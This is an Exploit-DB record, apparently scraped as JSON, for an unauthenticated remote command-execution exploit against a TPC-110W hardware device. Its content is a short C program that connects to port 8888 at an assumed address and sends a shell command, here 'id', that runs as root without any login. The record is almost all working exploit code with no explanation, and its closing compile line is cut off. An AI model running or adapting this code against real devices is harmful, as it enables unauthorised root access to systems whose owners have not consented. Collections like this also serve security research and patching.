{"source": "https://www.exploit-db.com/exploits/51846", "vulnName": "TPC-110W - Missing Authentication for Critical Function", "vulnEDBID": "51846", "vulnCVE": "N/A", "author": "AMIRHOSSEIN BAHRAMIZADEH", "exploitType": "REMOTE", "platform": "HARDWARE", "datePublished": "2024-03-03", "vulnContent": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#include <unistd.h>\n\nint main(int argc, char *argv[]) {\n    int sock;\n    struct sockaddr_in serv_addr;\n    char command[512];\n\n    sock = socket(AF_INET, SOCK_STREAM, 0);\n    if (sock < 0) {\n        perror(\"socket\");\n        exit(1);\n    }\n\n    memset(&serv_addr, '0', sizeof(serv_addr));\n    serv_addr.sin_family = AF_INET;\n    serv_addr.sin_port = htons(8888); // The default port of TPC-110W is 8888\n    if (inet_pton(AF_INET, \"192.168.1.10\", &serv_addr.sin_addr) <= 0) { // Assuming the device's IP address is 192.168.1.10\n        perror(\"inet_pton\");\n        exit(1);\n    }\n\n    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {\n        perror(\"connect\");\n        exit(1);\n    }\n\n    // Run command with root privileges\n    snprintf(command, sizeof(command), \"id\\n\"); // Check user id\n    write(sock, command, strlen(command));\n\n    memset(command, '0', sizeof(command));\n    read(sock, command, sizeof(command));\n    printf(\"%s\\n\", command);\n\n    close(sock);\n    return 0;\n}\n\n//gcc -o tpc-110w-exploit tpc-110w-exp\n            "}